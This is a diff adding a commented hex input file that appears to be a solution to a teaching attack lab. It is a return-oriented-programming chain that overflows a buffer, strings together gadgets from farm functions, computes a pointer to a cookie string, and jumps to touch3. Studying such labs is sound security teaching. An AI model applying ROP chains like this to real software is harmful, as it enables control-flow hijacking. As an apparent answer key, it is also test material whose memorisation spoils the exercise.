@@ -1,0 +1,42 @@
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+
+/* from `addval_190`, get `48 89 e0 c3`, which is the following instruction sequence: */
+/* - `movq %rsp, %rax`, store stack pointer (say `bp`) at this time point into $rax */
+/* - `ret` */
+06 1a 40 00 00 00 00 00
+
+/* from `addval_273`, get `48 89 c7 c3`, which is the following instruction sequence: */
+/* - `movq %rax, %rdi`, store `bp` into $rdi */
+/* - `ret` */
+a2 19 40 00 00 00 00 00
+
+/* call `add_xy`, store `bp+0x30` into $rax */
+d6 19 40 00 00 00 00 00
+
+/* from `addval_273`, get `48 89 c7 c3`, which is the following instruction sequence: */
+/* - `movq %rax, %rdi`, store `bp+0x30` into $rdi */
+/* - `ret` */
+a2 19 40 00 00 00 00 00
+
+/* from `setval_384`, get `84 c0 c3`, which is the following instruction sequence: */
+/* - `testb %al, %al` */
+/* - `ret` */
+/* this sequence is a functional nop */
+00 1a 40 00 00 00 00 00
+
+/* address of `touch3` */
+fa 18 40 00 00 00 00 00
+
+/* blank byte sequence, other random bytes may cause segment fault! */
+00 00 00 00 00 00 00 00
+
+/* byte representation of `59b997fa`, with ending `\0` */
+/* it is at address `bp+0x30` */
+35 39 62 39 39 37 66 61
+00
+
+0a
